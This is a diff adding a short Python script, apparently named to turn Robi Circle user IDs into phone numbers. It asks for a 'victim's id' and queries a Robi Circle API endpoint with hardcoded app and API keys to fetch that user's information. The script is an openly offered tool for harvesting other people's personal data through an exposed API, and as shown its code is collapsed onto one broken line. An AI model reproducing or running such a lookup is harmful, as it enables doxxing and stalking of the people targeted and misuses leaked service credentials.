@@ -1,0 +1,2 @@
+# circle-I-d-to-namber-robi
+import requests nickname = str(input("Enter Your Victim's id:")) api = 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfobyNickname='+nickname header_robi_circle = {     'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',     'x-app-key':'000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg',     'x-api-key':'815b7131d00f3762a6a19a5bde5423f1'} a=requests.get(api,headers=header_robi_circle)
